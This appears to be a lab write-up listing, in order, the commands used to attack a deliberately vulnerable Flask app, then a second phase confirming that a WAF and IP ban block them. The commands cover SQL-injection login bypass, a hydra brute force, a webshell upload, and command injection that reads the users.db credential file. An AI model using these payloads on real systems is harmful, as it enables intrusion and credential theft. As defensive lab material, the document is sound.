# Attack Chain — Command Reference

Every command used to compromise the lab, in order, mapped to MITRE ATT&CK.
Run against the lab target only. Target below is the WAF/app on port 8000
(`192.168.64.1:8000` from the Kali VM, or `localhost:8000` from the host).

---

## Stage 1 — Reconnaissance (T1595)

```bash
# Service / version scan — identifies the Python/Flask (Werkzeug) backend
nmap -sV -p 8000 192.168.64.1

# Directory & endpoint enumeration — finds /login, /dashboard, /upload, /ping
gobuster dir -u http://192.168.64.1:8000 -w /usr/share/wordlists/dirb/common.txt -t 20
```

## Stage 2 — Initial Access (T1190, T1110)

```bash
# Confirm SQL injection and dump the user table (Phase 1: succeeds)
sqlmap -u "http://192.168.64.1:8000/login" \
  --data="username=admin&password=x" -p username \
  --batch --code=302 --dump -T users
# (add --flush-session --fresh-queries to force a live re-test through the WAF)

# Manual SQL-injection auth bypass — returns 302 + admin session cookie in Phase 1
curl -s -i -X POST http://192.168.64.1:8000/login \
  --data "username=admin' OR '1'='1&password=anything"

# Brute force the login (exploits the no-lockout weakness)
printf 'admin\n123456\nletmein\npassword\npassword123\nqwerty\n' > ~/wordlist.txt
hydra -l ajadi -P ~/wordlist.txt 192.168.64.1 -s 8000 \
  http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials" -V
```

## Stage 3 — Foothold / Webshell (T1505.003)

```bash
# Build a payload, authenticate, and upload it through the unrestricted upload
echo '#!/bin/bash
id; whoami; hostname' > ~/shell.sh

curl -s -c ~/cookies.txt -X POST http://192.168.64.1:8000/login \
  --data "username=ajadi&password=password123" -o /dev/null

curl -s -b ~/cookies.txt -X POST http://192.168.64.1:8000/upload \
  -F "file=@/home/kali/shell.sh"
```

## Stage 4 — Execution / RCE (T1059)

```bash
# Command injection via the /ping diagnostics tool -> runs as root in Phase 1
curl -s -b ~/cookies.txt -X POST http://192.168.64.1:8000/ping \
  --data-urlencode "host=8.8.8.8; id; whoami; hostname"

# Chain upload + injection: run the uploaded webshell
curl -s -b ~/cookies.txt -X POST http://192.168.64.1:8000/ping \
  --data-urlencode "host=8.8.8.8; bash /app/uploads/shell.sh"
```

## Stage 5 — Exfiltration (T1041 / T1005)

```bash
# Read the credential database off disk via command injection
curl -s -b ~/cookies.txt -X POST http://192.168.64.1:8000/ping \
  --data-urlencode "host=8.8.8.8; base64 /app/users.db"
# (SQLite is binary; base64 for safe transport, or use the sqlmap --dump above)
```

---

## Phase 2 — verifying the defense blocks the same attacks

```bash
# SQLi now blocked by the WAF
curl -s -o /dev/null -w "%{http_code}\n" -X POST http://192.168.64.1:8000/login \
  --data "username=admin' OR '1'='1&password=x"        # -> 403

# Command injection now blocked by the WAF
curl -s -o /dev/null -w "%{http_code}\n" -X POST http://192.168.64.1:8000/ping \
  --data-urlencode "host=8.8.8.8; id; whoami"          # -> 403

# sqlmap through the WAF (flush cache to force a real test)
sqlmap -u "http://192.168.64.1:8000/login" --data="username=admin&password=x" \
  -p username --batch --code=302 --flush-session --fresh-queries --dump -T users
#   -> "target is protected by some kind of WAF/IPS", no dump

# Brute force -> auto-responder bans the IP, then all requests are 403
hydra -l ajadi -P ~/wordlist.txt 192.168.64.1 -s 8000 \
  http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials" -V
curl -s -o /dev/null -w "%{http_code}\n" http://192.168.64.1:8000/login   # -> 403 (banned)
```
